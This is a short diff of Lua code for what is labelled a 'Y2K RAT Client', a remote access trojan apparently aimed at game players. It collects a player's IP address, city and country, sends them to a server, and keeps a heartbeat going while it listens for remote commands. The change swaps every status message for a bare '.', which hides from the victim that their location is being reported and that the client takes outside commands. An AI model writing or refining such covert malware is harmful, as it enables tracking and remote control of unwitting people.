@@ -291,12 +291,12 @@ local function listenForCommands()
 end
 
 -- Main execution
-print("🚀 Y2K RAT Client - Initializing...")
+print(".")
 local playerInfo = getPlayerInfo()
-print("📡 Connecting to server...")
-print("🌐 IP:", playerInfo.ip)
-print("📍 Location:", playerInfo.city, playerInfo.country)
+print(".")
+print(".")
+print(".")
 sendToServer(playerInfo)
-print("✅ Connected successfully!")
+print(".")
 startHeartbeat()
 listenForCommands()
